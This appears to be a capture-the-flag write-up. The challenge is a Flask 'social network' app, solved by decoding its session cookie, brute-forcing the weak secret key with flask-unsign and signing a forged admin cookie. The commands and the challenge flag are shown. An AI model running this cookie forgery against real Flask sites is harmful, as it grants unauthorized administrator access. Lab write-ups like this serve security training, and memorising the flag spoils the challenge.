#### Challenge:

Hi Expert,

the application running on `http://78.128.216.18:65181` was probably some kind of social network. Get access to the system and export any valuable data.

Good Luck!

---

#### Solution:

- inspecting the website reveals that it uses `flask` thus we try to forge our custom cookie, with brute-force of the server key

```bash
pip3 install flask-unsign
pip3 install flask-unsign[wordlist]

flask-unsign -d -c 'eyJ1c2VybmFtZSI6bnVsbH0.YWReMQ.jiNtpXvQ8CZtIqXYv0wRmVpKpak'
flask-unsign --server http://78.128.216.18:65181/ --unsign
flask-unsign --sign --secret f3cfe9ed8fae309f02079dbf --cookie "{'username': 'admin'}"
```

---

<details><summary>FLAG:</summary>

```
FLAG{r4Kt-Ws0C-J3b3-2EJg}
```

</details>
<br/>
